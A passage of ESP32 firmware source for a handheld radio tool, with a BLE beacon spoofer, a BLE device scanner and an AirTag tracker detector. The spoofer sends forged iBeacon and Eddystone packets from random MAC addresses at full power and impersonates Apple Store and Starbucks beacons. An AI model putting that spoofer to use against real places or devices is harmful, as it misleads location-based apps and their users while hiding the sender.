    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setCursor(SCALE_X(160), counterY + 3);
    tft.printf("%d bcn/s", currentRate);
}

// Skull row at bottom (matches BleSpoofer pattern)
static int bcnSkullFrame = 0;
static const unsigned char* bcnSkulls[8] = {
    bitmap_icon_skull_wifi, bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer, bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir, bitmap_icon_skull_tools,
    bitmap_icon_skull_setting, bitmap_icon_skull_about
};

static void bcnDrawSkulls() {
    int skullY = SCREEN_HEIGHT - 48;
    int skullStartX = 10;
    int skullSpacing = (SCREEN_WIDTH - 20) / 8;

    for (int i = 0; i < 8; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, skullY, 16, 16, TFT_BLACK);

        uint16_t color;
        if (beaconing) {
            int phase = (bcnSkullFrame + i) % 8;
            if (phase < 4) {
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;
        }

        tft.drawBitmap(x, skullY, bcnSkulls[i], 16, 16, color);
    }

    // TX/OFF label
    tft.fillRect(skullStartX + (8 * skullSpacing), skullY, 50, 16, TFT_BLACK);
    tft.setTextColor(beaconing ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(skullStartX + (8 * skullSpacing) + 5, skullY + 4);
    tft.print(beaconing ? "TX!" : "OFF");

    bcnSkullFrame++;
}

// ═══════════════════════════════════════════════════════════════════════════
// PACKET BUILDERS
// ═══════════════════════════════════════════════════════════════════════════

// Build standard 30-byte iBeacon advertisement payload
// Returns total packet length (always 30)
static int buildIBeaconPacket(uint8_t* buf, const uint8_t* uuid, uint16_t major, uint16_t minor, int8_t txPower) {
    int i = 0;
    // Flags AD structure
    buf[i++] = 0x02;  // Length
    buf[i++] = 0x01;  // Flags type
    buf[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Manufacturer Specific Data
    buf[i++] = 0x1A;  // AD Length = 26 bytes follow
    buf[i++] = 0xFF;  // Manufacturer Specific Data type
    buf[i++] = 0x4C;  // Apple Inc (low byte)
    buf[i++] = 0x00;  // Apple Inc (high byte)
    buf[i++] = 0x02;  // iBeacon type
    buf[i++] = 0x15;  // iBeacon data length (21 bytes)
    // UUID (16 bytes)
    memcpy(&buf[i], uuid, 16);
    i += 16;
    // Major (big-endian)
    buf[i++] = (major >> 8) & 0xFF;
    buf[i++] = major & 0xFF;
    // Minor (big-endian)
    buf[i++] = (minor >> 8) & 0xFF;
    buf[i++] = minor & 0xFF;
    // TX Power (calibrated at 1m)
    buf[i++] = (uint8_t)txPower;
    return i;  // 30
}

// Build Eddystone-URL advertisement payload
// Returns total packet length
static int buildEddystoneURL(uint8_t* buf, const char* url) {
    int i = 0;
    // Flags AD structure
    buf[i++] = 0x02;  // Length
    buf[i++] = 0x01;  // Flags type
    buf[i++] = 0x06;  // General Discoverable + BR/EDR Not Supported
    // Complete 16-bit Service UUID (Eddystone 0xFEAA)
    buf[i++] = 0x03;  // Length
    buf[i++] = 0x03;  // Complete 16-bit UUID list type
    buf[i++] = 0xAA;  // 0xFEAA little-endian low
    buf[i++] = 0xFE;  // 0xFEAA little-endian high
    // Service Data start — length filled at end
    int svcLenPos = i;
    buf[i++] = 0x00;  // Placeholder for service data length
    buf[i++] = 0x16;  // Service Data type
    buf[i++] = 0xAA;  // 0xFEAA little-endian low
    buf[i++] = 0xFE;  // 0xFEAA little-endian high
    // Eddystone-URL frame
    buf[i++] = 0x10;  // Frame type: URL
    buf[i++] = 0xF4;  // TX Power at 0m (-12 dBm typical)
    // URL scheme prefix
    buf[i++] = 0x01;  // "https://www."
    // Encode URL (with .com expansion code per Eddystone spec)
    int urlLen = strlen(url);
    if (urlLen > 17) urlLen = 17;  // Max URL bytes in BLE adv
    for (int u = 0; u < urlLen; u++) {
        // Encode .com as 0x00 per Eddystone spec
        if (u + 3 < urlLen && url[u] == '.' && url[u+1] == 'c' && url[u+2] == 'o' && url[u+3] == 'm') {
            buf[i++] = 0x00;  // .com expansion code
            u += 3;  // Skip past ".com"
        } else {
            buf[i++] = (uint8_t)url[u];
        }
    }
    // Fill in service data length (everything after the length byte)
    buf[svcLenPos] = (uint8_t)(i - svcLenPos - 1);
    return i;
}

// Build Eddystone-UID advertisement payload
// Returns total packet length
static int buildEddystoneUID(uint8_t* buf, const uint8_t* ns, const uint8_t* instance) {
    int i = 0;
    // Flags AD structure
    buf[i++] = 0x02;
    buf[i++] = 0x01;
    buf[i++] = 0x06;
    // Complete 16-bit Service UUID (Eddystone 0xFEAA)
    buf[i++] = 0x03;
    buf[i++] = 0x03;
    buf[i++] = 0xAA;
    buf[i++] = 0xFE;
    // Service Data
    buf[i++] = 0x15;  // Length: 21 bytes follow
    buf[i++] = 0x16;  // Service Data type
    buf[i++] = 0xAA;  // 0xFEAA
    buf[i++] = 0xFE;
    // Eddystone-UID frame
    buf[i++] = 0x00;  // Frame type: UID
    buf[i++] = 0xF4;  // TX Power at 0m
    // Namespace (10 bytes)
    memcpy(&buf[i], ns, 10);
    i += 10;
    // Instance (6 bytes)
    memcpy(&buf[i], instance, 6);
    i += 6;
    // Reserved (2 bytes, must be 0x00)
    buf[i++] = 0x00;
    buf[i++] = 0x00;
    return i;  // 25
}

// ═══════════════════════════════════════════════════════════════════════════
// BROADCAST ENGINE
// ═══════════════════════════════════════════════════════════════════════════

static void doBroadcast() {
    // Stop any current advertising
    esp_ble_gap_stop_advertising();

    // Generate random BLE MAC address
    esp_bd_addr_t addr;
    esp_fill_random(addr, 6);
    addr[0] |= 0xC0;  // BLE random static address type

    esp_ble_gap_set_rand_addr(addr);

    // Build packet based on current mode
    uint8_t pkt[31];
    int pktLen = 0;
    char logBuf[42];

    switch (currentMode) {
        case BCN_RANDOM_IBEACON: {
            // Random UUID, Major, Minor each cycle
            uint8_t randUUID[16];
            esp_fill_random(randUUID, 16);
            uint16_t major = (uint16_t)random(0xFFFF);
            uint16_t minor = (uint16_t)random(0xFFFF);
            pktLen = buildIBeaconPacket(pkt, randUUID, major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] iBeacon %04X:%04X", major, minor);
            break;
        }
        case BCN_APPLE_STORE: {
            uint16_t major = 1 + (uint16_t)random(50);  // Store section
            uint16_t minor = 1 + (uint16_t)random(200);  // Fixture
            pktLen = buildIBeaconPacket(pkt, UUID_APPLE_STORE, major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] Apple %d:%d", major, minor);
            break;
        }
        case BCN_STARBUCKS: {
            uint16_t major = 100 + (uint16_t)random(900);
            uint16_t minor = 1 + (uint16_t)random(50);
            pktLen = buildIBeaconPacket(pkt, UUID_STARBUCKS, major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] Starbucks %d:%d", major, minor);
            break;
        }
        case BCN_EDDYSTONE_URL: {
            pktLen = buildEddystoneURL(pkt, EDDYSTONE_URL_PRESET);
            snprintf(logBuf, sizeof(logBuf), "[+] Eddy-URL: %s", EDDYSTONE_URL_PRESET);
            break;
        }
        case BCN_EDDYSTONE_UID: {
            uint8_t ns[10];
            uint8_t instance[6];
            esp_fill_random(ns, 10);
            esp_fill_random(instance, 6);
            pktLen = buildEddystoneUID(pkt, ns, instance);
            snprintf(logBuf, sizeof(logBuf), "[+] Eddy-UID %02X%02X:%02X%02X",
                     ns[0], ns[1], instance[0], instance[1]);
            break;
        }
        case BCN_GEO_FENCE: {
            // Cycle through all retail presets rapidly
            int presetIdx = geoFenceStep % GEO_FENCE_PRESET_COUNT;
            uint16_t major = 1 + (uint16_t)random(500);
            uint16_t minor = 1 + (uint16_t)random(500);
            pktLen = buildIBeaconPacket(pkt, GEO_FENCE_UUIDS[presetIdx], major, minor, -59);
            snprintf(logBuf, sizeof(logBuf), "[+] GeoF %s %d:%d",
                     GEO_FENCE_NAMES[presetIdx], major, minor);
            geoFenceStep++;
            break;
        }
        default:
            return;
    }

    // Set raw advertising data via ESP-IDF
    esp_ble_gap_config_adv_data_raw(pkt, pktLen);
    delay(1);

    // Start advertising
    esp_ble_gap_start_advertising(&bcnAdvParams);
    delay(20);
    esp_ble_gap_stop_advertising();

    // Update counters
    packetCount++;
    rateWindowCount++;

    // Serial debug for first 5 packets
    if (packetCount <= 5) {
        Serial.printf("[BEACON] TX #%lu mode=%d len=%d addr=%02X:%02X:%02X\n",
            packetCount, currentMode, pktLen, addr[0], addr[1], addr[2]);
    }

    bcnAddLog(logBuf, HALEHOUND_VIOLET);
}

// ═══════════════════════════════════════════════════════════════════════════
// CORE 0 BROADCAST TASK — Runs doBroadcast() as fast as BLE allows
// BLE advertising has inherent ~21ms per cycle (delay(1) + delay(20))
// ═══════════════════════════════════════════════════════════════════════════

static void bcnTxTask(void* param) {
    bcnTaskRunning = true;
    unsigned long rateStart = millis();

    while (beaconing) {
        // Heap safety — BLEAdvertisementData allocates std::string on heap
        if (esp_get_free_heap_size() < 8192) {
            vTaskDelay(pdMS_TO_TICKS(50));
            continue;
        }

        doBroadcast();  // Increments packetCount and rateWindowCount

        // Update rate counter every second
        unsigned long now = millis();
        if (now - rateStart >= 1000) {
            currentRate = (uint16_t)rateWindowCount;
            rateWindowCount = 0;
            rateStart = now;
        }

        // Yield — delay(20) in doBroadcast already yields, but belt and suspenders
        vTaskDelay(1);
    }

    bcnTaskRunning = false;
    vTaskDelete(NULL);
}

static void startBcnTask() {
    if (bcnTaskHandle != NULL) return;
    xTaskCreatePinnedToCore(bcnTxTask, "bleBeacon", 8192, NULL, 1, &bcnTaskHandle, 0);
}

static void stopBcnTask() {
    beaconing = false;
    if (bcnTaskHandle == NULL) return;

    // Wait for task to finish (500ms timeout)
    unsigned long start = millis();
    while (bcnTaskRunning && (millis() - start < 500)) {
        delay(10);
    }

    // Force kill if task didn't exit cleanly
    if (bcnTaskRunning) {
        vTaskDelete(bcnTaskHandle);
    }

    bcnTaskHandle = NULL;
    bcnTaskRunning = false;

    // Stop any lingering advertising
    esp_ble_gap_stop_advertising();
}

// ═══════════════════════════════════════════════════════════════════════════
// CONTROL FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

static void startBeacon() {
    beaconing = true;
    rateWindowCount = 0;
    bcnAddLog("[!] BEACON STARTED", HALEHOUND_HOTPINK);
    bcnDrawIconBar();
    bcnDrawHeader();
    bcnDrawLog();

    startBcnTask();  // Launch Core 0 broadcast engine

    #if CYD_DEBUG
    Serial.printf("[BEACON] Started - Mode: %s (Core 0)\n", BCN_MODE_NAMES[currentMode]);
    #endif
}

static void stopBeacon() {
    stopBcnTask();  // Stop Core 0 task first
    bcnAddLog("[!] BEACON STOPPED", HALEHOUND_HOTPINK);
    bcnDrawIconBar();
    bcnDrawHeader();

    #if CYD_DEBUG
    Serial.println("[BEACON] Stopped");
    #endif
}

static void toggleBeacon() {
    if (beaconing) stopBeacon(); else startBeacon();
}

static void nextMode() {
    currentMode = (currentMode + 1) % BCN_MODE_COUNT;
    bcnDrawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", BCN_MODE_NAMES[currentMode]);
    bcnAddLog(buf, HALEHOUND_HOTPINK);
}

static void prevMode() {
    currentMode = (currentMode - 1 + BCN_MODE_COUNT) % BCN_MODE_COUNT;
    bcnDrawHeader();
    char buf[42];
    snprintf(buf, sizeof(buf), "[*] Mode: %s", BCN_MODE_NAMES[currentMode]);
    bcnAddLog(buf, HALEHOUND_HOTPINK);
}

// ═══════════════════════════════════════════════════════════════════════════
// PUBLIC FUNCTIONS
// ═══════════════════════════════════════════════════════════════════════════

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BEACON] Initializing BLE Beacon...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Kill WiFi — shares 2.4GHz radio with BLE
    // MUST use Arduino API to keep _esp_wifi_started flag in sync
    WiFi.mode(WIFI_OFF);
    delay(200);

    // Initialize BLE — wait for controller ready before TX power
    releaseClassicBtMemory();
    BLEDevice::init("HaleHound");
    delay(150);  // BLE controller needs time to finish internal init

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    Serial.println("[BEACON] BLE stack initialized, max TX power set");

    // Reset state
    beaconing = false;
    exitRequested = false;
    packetCount = 0;
    currentRate = 0;
    rateWindowCount = 0;
    bcnLogCount = 0;
    bcnSkullFrame = 0;
    geoFenceStep = 0;
    currentMode = BCN_RANDOM_IBEACON;
    bcnTaskHandle = NULL;
    bcnTaskRunning = false;

    // Draw full UI
    bcnDrawIconBar();
    bcnDrawHeader();
    bcnDrawSkulls();
    bcnDrawCounter();

    bcnAddLog("[*] BLE Beacon ready", HALEHOUND_MAGENTA);
    char modeBuf[42];
    snprintf(modeBuf, sizeof(modeBuf), "[*] Mode: %s", BCN_MODE_NAMES[currentMode]);
    bcnAddLog(modeBuf, HALEHOUND_MAGENTA);
    bcnDrawLog();

    lastDisplayUpdate = millis();
    initialized = true;

    #if CYD_DEBUG
    Serial.println("[BEACON] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // ═══════════════════════════════════════════════════════════════════════
    // TOUCH HANDLING
    // Icons: Back=10, Toggle=70, PrevMode=140, NextMode=200
    // ═══════════════════════════════════════════════════════════════════════
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        // Icon bar area (y=20-40)
        if (ty >= 20 && ty <= 40) {
            waitForTouchRelease();

            // Back icon (x=10)
            if (tx >= 5 && tx <= 30) {
                if (beaconing) stopBeacon();
                exitRequested = true;
                return;
            }
            // Toggle icon (x=70)
            else if (tx >= 60 && tx <= 90) {
                toggleBeacon();
                return;
            }
            // Prev mode icon (x=140)
            else if (tx >= 130 && tx <= 160) {
                prevMode();
                return;
            }
            // Next mode icon (x=200)
            else if (tx >= 190 && tx <= 220) {
                nextMode();
                return;
            }
        }
    }

    // Hardware button fallback
    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (beaconing) stopBeacon();
        exitRequested = true;
        return;
    }

    // Button navigation
    if (buttonPressed(BTN_LEFT)) prevMode();
    if (buttonPressed(BTN_RIGHT)) nextMode();
    if (buttonPressed(BTN_SELECT)) toggleBeacon();

    // Broadcast engine runs on Core 0 (bcnTxTask)
    // Rate calculation also runs on Core 0

    // Feed the watchdog
    yield();

    // ═══════════════════════════════════════════════════════════════════════
    // DISPLAY UPDATE (~10fps)
    // ═══════════════════════════════════════════════════════════════════════
    if (millis() - lastDisplayUpdate >= 100) {
        bcnDrawSkulls();
        bcnDrawCounter();
        bcnDrawLog();
        bcnDrawRate();  // Lightweight — only rate + pkt count, no full header clear
        lastDisplayUpdate = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    stopBcnTask();  // Stop Core 0 task before BLE teardown

    BLEDevice::deinit(false);  // false = library bug: deinit(true) never resets initialized flag

    initialized = false;
    exitRequested = false;
    bcnLogDirty = false;
    bcnLogCount = 0;

    #if CYD_DEBUG
    Serial.println("[BEACON] Cleanup complete");
    #endif
}

}  // namespace BleBeacon

// ═══════════════════════════════════════════════════════════════════════════
// BLE SCAN IMPLEMENTATION - Bluetooth Device Scanner
// ═══════════════════════════════════════════════════════════════════════════

namespace BleScan {

#define MAX_VISIBLE_DEVICES 12
#define DEVICE_LINE_HEIGHT 16

static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;

static BLEScan* pBleScan = nullptr;
static BLEScanResults scanResults;

static int currentIndex = 0;
static int listStartIndex = 0;
static int deviceCount = 0;

// Icon bar - MATCHES ORIGINAL (2 icons: undo at x=210, back at x=10)
#define BSCAN_ICON_SIZE 16
#define BSCAN_ICON_NUM 2
static int bscanIconX[BSCAN_ICON_NUM] = {210, 10};
static int bscanIconY = ICON_BAR_Y;

// Draw icon bar - MATCHES ORIGINAL ESP32-DIV
static void drawBleScanUI() {
    tft.drawLine(0, ICON_BAR_TOP, tft.width(), ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(SCALE_X(140), ICON_BAR_Y, SCREEN_WIDTH - SCALE_X(140), ICON_BAR_H, HALEHOUND_GUNMETAL);
    tft.drawBitmap(bscanIconX[0], bscanIconY, bitmap_icon_undo, BSCAN_ICON_SIZE, BSCAN_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(bscanIconX[1], bscanIconY, bitmap_icon_go_back, BSCAN_ICON_SIZE, BSCAN_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

// Draw device list
static void drawDeviceList() {
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);

    deviceCount = scanResults.getCount();

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 45);
    tft.print("BLE Devices: ");
    tft.print(deviceCount);

    if (deviceCount == 0) {
        tft.setCursor(10, 70);
        tft.print("No devices found");
        tft.setCursor(10, 85);
        tft.print("Press SELECT to scan");
        return;
    }

    int y = 60;
    for (int i = 0; i < MAX_VISIBLE_DEVICES && i + listStartIndex < deviceCount; i++) {
        int idx = i + listStartIndex;
        BLEAdvertisedDevice device = scanResults.getDevice(idx);

        String name;
        if (device.getName().length() > 0) {
            name = String(device.getName().c_str()).substring(0, 16);
        } else if (device.haveManufacturerData()) {
            std::string mfg = device.getManufacturerData();
            if (mfg.length() >= 2) {
                uint16_t cid = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
                const char* cn = lookupCompanyName(cid);
                name = cn ? String("[") + cn + "]" : "Unknown";
            } else {
                name = "Unknown";
            }
        } else {
            name = "Unknown";
        }

        if (idx == currentIndex) {
            tft.fillRect(0, y - 2, SCREEN_WIDTH, DEVICE_LINE_HEIGHT, HALEHOUND_DARK);
            tft.setTextColor(HALEHOUND_HOTPINK);
            tft.setCursor(5, y);
            tft.print("> ");
        } else {
            tft.setTextColor(HALEHOUND_MAGENTA);
            tft.setCursor(5, y);
            tft.print("  ");
        }

        tft.setCursor(20, y);
        tft.print(name);

        tft.setCursor(SCREEN_WIDTH - 50, y);
        tft.print(device.getRSSI());
        tft.print("dB");

        y += DEVICE_LINE_HEIGHT;
    }

    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("UP/DOWN=Nav SELECT=Details/Scan");
}

// Draw device details
static void drawDeviceDetails() {
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);

    if (deviceCount == 0 || currentIndex >= deviceCount) return;

    BLEAdvertisedDevice device = scanResults.getDevice(currentIndex);

    String name;
    if (device.getName().length() > 0) {
        name = String(device.getName().c_str());
    } else if (device.haveManufacturerData()) {
        std::string mfg = device.getManufacturerData();
        if (mfg.length() >= 2) {
            uint16_t cid = (uint8_t)mfg[0] | ((uint8_t)mfg[1] << 8);
            const char* cn = lookupCompanyName(cid);
            name = cn ? String("[") + cn + " Device]" : "Unknown Device";
        } else {
            name = "Unknown Device";
        }
    } else {
        name = "Unknown Device";
    }
    String address = String(device.getAddress().toString().c_str());
    int rssi = device.getRSSI();
    int txPower = device.getTXPower();

    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(5, 45);
    tft.print("Device Details");

    tft.setTextColor(HALEHOUND_BRIGHT);
    int y = 65;

    tft.setCursor(10, y); tft.print("Name: "); tft.print(name.substring(0, 20));
    y += 18;
    tft.setCursor(10, y); tft.print("MAC: "); tft.print(address);
    y += 18;
    tft.setCursor(10, y); tft.print("RSSI: "); tft.print(rssi); tft.print(" dBm");
    y += 18;
    tft.setCursor(10, y); tft.print("TX Power: "); tft.print(txPower); tft.print(" dBm");
    y += 18;

    if (device.haveServiceUUID()) {
        tft.setCursor(10, y);
        tft.print("UUID: ");
        tft.print(String(device.getServiceUUID().toString().c_str()).substring(0, 20));
    } else {
        tft.setCursor(10, y);
        tft.print("No Service UUID");
    }
    y += 18;

    if (device.haveManufacturerData()) {
        tft.setCursor(10, y);
        tft.print("Has Manufacturer Data");
    } else {
        tft.setCursor(10, y);
        tft.print("No Manufacturer Data");
    }

    tft.setTextColor(HALEHOUND_VIOLET);
    tft.setCursor(5, SCREEN_HEIGHT - 12);
    tft.print("BACK=Return to list");
}

// Show scanning animation
static void showScanning() {
    tft.fillRect(0, 37, SCREEN_WIDTH, SCREEN_HEIGHT - 37, HALEHOUND_BLACK);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setCursor(10, 50);
    tft.print("[*] Scanning for BLE devices...");
}

void startScan() {
    showScanning();
    scanning = true;

    scanResults = pBleScan->start(5, false);
    deviceCount = scanResults.getCount();
    currentIndex = 0;
    listStartIndex = 0;

    scanning = false;
    drawDeviceList();
}

void setup() {
    if (initialized) return;

    #if CYD_DEBUG
    Serial.println("[BLESCAN] Initializing...");
    #endif

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawBleScanUI();

    // Tear down WiFi before BLE init — frees ~50KB heap
    WiFi.mode(WIFI_OFF);
    delay(50);

    releaseClassicBtMemory();
    BLEDevice::init("");
    delay(150);  // BLE controller needs time after deinit/reinit cycle

    pBleScan = BLEDevice::getScan();
    if (!pBleScan) {
        Serial.println("[BLESCAN] ERROR: getScan() returned NULL");
        exitRequested = true;
        return;
    }
    pBleScan->setActiveScan(true);

    detailView = false;
    exitRequested = false;
    initialized = true;

    startScan();

    // Consume any lingering touch from menu selection — prevents
    // isBackButtonTapped() in .ino from immediately exiting
    waitForTouchRelease();

    #if CYD_DEBUG
    Serial.println("[BLESCAN] Ready");
    #endif
}

void loop() {
    if (!initialized) return;

    touchButtonsUpdate();

    // Icon bar touch handling - undo at x=210, back at x=10
    static unsigned long lastIconTap = 0;
    if (millis() - lastIconTap > 200) {
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty)) {
            if (ty >= ICON_BAR_Y && ty <= ICON_BAR_BOTTOM) {
                // Back icon at x=10-26
                if (tx >= 10 && tx < 26) {
                    if (detailView) {
                        detailView = false;
                        drawDeviceList();
                        waitForTouchRelease();  // Eat touch so .ino isBackButtonTapped() doesn't double-fire
                    } else {
                        exitRequested = true;
                    }
                    lastIconTap = millis();
                    return;
                }
                // Undo/Rescan icon at x=210-226
                else if (tx >= 210 && tx < 226) {
                    startScan();
                    lastIconTap = millis();
                    return;
                }
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        if (detailView) {
            detailView = false;
            drawDeviceList();
            waitForTouchRelease();  // Eat touch so .ino doesn't double-fire exit
        } else {
            exitRequested = true;
        }
        return;
    }

    if (detailView) {
        // Detail view - LEFT to go back
        if (buttonPressed(BTN_LEFT)) {
            detailView = false;
            drawDeviceList();
            waitForTouchRelease();
        }
    } else {
        // List view
        if (buttonPressed(BTN_UP)) {
            if (currentIndex > 0) {
                currentIndex--;
                if (currentIndex < listStartIndex) listStartIndex--;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_DOWN)) {
            if (currentIndex < deviceCount - 1) {
                currentIndex++;
                if (currentIndex >= listStartIndex + MAX_VISIBLE_DEVICES) listStartIndex++;
                drawDeviceList();
            }
        }

        if (buttonPressed(BTN_RIGHT)) {
            if (deviceCount > 0) {
                detailView = true;
                drawDeviceDetails();
            }
        }

        if (buttonPressed(BTN_SELECT)) {
            if (deviceCount > 0 && !detailView) {
                detailView = true;
                drawDeviceDetails();
            } else {
                startScan();
            }
        }

        if (buttonPressed(BTN_LEFT)) {
            startScan();
        }

        // Touch to select device
        int touched = getTouchedMenuItem(60, DEVICE_LINE_HEIGHT, min(MAX_VISIBLE_DEVICES, deviceCount - listStartIndex));
        if (touched >= 0) {
            currentIndex = listStartIndex + touched;
            detailView = true;
            drawDeviceDetails();
        }
    }
}

int getDeviceCount() { return deviceCount; }
bool isScanning() { return scanning; }
bool isDetailView() { return detailView; }
bool isExitRequested() { return exitRequested; }

void cleanup() {
    if (pBleScan) pBleScan->stop();
    BLEDevice::deinit(false);  // false = keep BLE memory so reinit works
    initialized = false;
    exitRequested = false;

    // Restore WiFi for other modules
    WiFi.mode(WIFI_STA);

    #if CYD_DEBUG
    Serial.println("[BLESCAN] Cleanup complete");
    #endif
}

}  // namespace BleScan


// ═══════════════════════════════════════════════════════════════════════════
// AIRTAG DETECTOR - Apple FindMy Tracker Detection
// Scans BLE advertisements for Apple FindMy network devices:
//   - AirTags, FindMy accessories, OpenHaystack clones
//   - Detects manufacturer data: Company 0x004C, Type 0x12, Len 0x19
//   - Extracts battery level from status byte (bits 6-7)
//   - Tracks unique devices by MAC with proximity RSSI bars
//   - Auto-rescan every 5 seconds, alert flash on new tracker
// ═══════════════════════════════════════════════════════════════════════════

namespace AirTagDetect {

#define AT_MAX_TRACKERS    20
#define AT_MAX_VISIBLE     10
#define AT_LINE_HEIGHT     18
#define AT_SCAN_DURATION   4
#define AT_RESCAN_INTERVAL 5000
#define AT_ICON_SIZE       16

// Tracked device struct
struct TrackedTag {
    uint8_t mac[6];
    int rssi;
    uint8_t battery;      // 0=full, 1=medium, 2=low, 3=critical
    uint8_t statusByte;
    unsigned long firstSeen;
    unsigned long lastSeen;
    bool isNew;
};

static TrackedTag trackers[AT_MAX_TRACKERS];
static int trackerCount = 0;
static int currentIndex = 0;
static int listStartIndex = 0;

static bool initialized = false;
static bool exitRequested = false;
static bool scanning = false;
static bool detailView = false;
static bool alertFlash = false;
static unsigned long lastScanTime = 0;
static unsigned long alertStart = 0;
static int totalScans = 0;

static BLEScan* pAtScan = nullptr;

// ═══════════════════════════════════════════════════════════════════════════
// HELPERS
// ═══════════════════════════════════════════════════════════════════════════

static String macToStr(const uint8_t* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static const char* batteryStr(uint8_t level) {
    switch (level) {
        case 0: return "FULL";
        case 1: return "MED";
        case 2: return "LOW";
        case 3: return "CRIT";
        default: return "???";
    }
}

static uint16_t batteryColor(uint8_t level) {
    switch (level) {
        case 0: return HALEHOUND_GREEN;
        case 1: return HALEHOUND_MAGENTA;
        case 2: return HALEHOUND_HOTPINK;
        case 3: return 0xF800;  // Red
        default: return HALEHOUND_GUNMETAL;
    }
}

// Find existing tracker by MAC, returns index or -1
static int findTracker(const uint8_t* mac) {
    for (int i = 0; i < trackerCount; i++) {
        if (memcmp(trackers[i].mac, mac, 6) == 0) return i;
    }
    return -1;
}

// Add or update a tracked device
static bool addOrUpdateTracker(const uint8_t* mac, int rssi, uint8_t battery, uint8_t status) {
    int idx = findTracker(mac);
    if (idx >= 0) {
        // Update existing
        trackers[idx].rssi = rssi;
        trackers[idx].battery = battery;
        trackers[idx].statusByte = status;
        trackers[idx].lastSeen = millis();
        trackers[idx].isNew = false;
        return false;  // Not new
    }
    if (trackerCount >= AT_MAX_TRACKERS) return false;

    // Add new tracker
    memcpy(trackers[trackerCount].mac, mac, 6);
    trackers[trackerCount].rssi = rssi;
    trackers[trackerCount].battery = battery;
    trackers[trackerCount].statusByte = status;
    trackers[trackerCount].firstSeen = millis();
    trackers[trackerCount].lastSeen = millis();
    trackers[trackerCount].isNew = true;
    trackerCount++;
    return true;  // New tracker found
}

// Estimate distance from RSSI
static const char* proximityStr(int rssi) {
    if (rssi > -40) return "< 1m";
    if (rssi > -55) return "1-3m";
    if (rssi > -70) return "3-8m";
    if (rssi > -85) return "8-15m";
    return "> 15m";
}

// Draw RSSI bar (5 segments)
static void drawRssiBar(int x, int y, int rssi) {
    int bars = 0;
    if (rssi > -40) bars = 5;
    else if (rssi > -55) bars = 4;
    else if (rssi > -65) bars = 3;
    else if (rssi > -75) bars = 2;
    else if (rssi > -90) bars = 1;

    for (int i = 0; i < 5; i++) {
        int barH = 3 + i * 2;
        int barY = y + (12 - barH);
        uint16_t color = (i < bars) ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL;
        tft.fillRect(x + i * 4, barY, 3, barH, color);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// UI DRAWING
// ═══════════════════════════════════════════════════════════════════════════

static void drawIconBar() {
    tft.drawLine(0, 19, SCREEN_WIDTH, 19, HALEHOUND_MAGENTA);
    tft.fillRect(0, 20, SCREEN_WIDTH, 16, HALEHOUND_GUNMETAL);
    tft.drawBitmap(10, 20, bitmap_icon_go_back, AT_ICON_SIZE, AT_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawBitmap(210, 20, bitmap_icon_undo, AT_ICON_SIZE, AT_ICON_SIZE, HALEHOUND_MAGENTA);
    tft.drawLine(0, 36, SCREEN_WIDTH, 36, HALEHOUND_HOTPINK);
}

static void drawTitle() {
    tft.drawLine(0, 38, SCREEN_WIDTH, 38, HALEHOUND_HOTPINK);
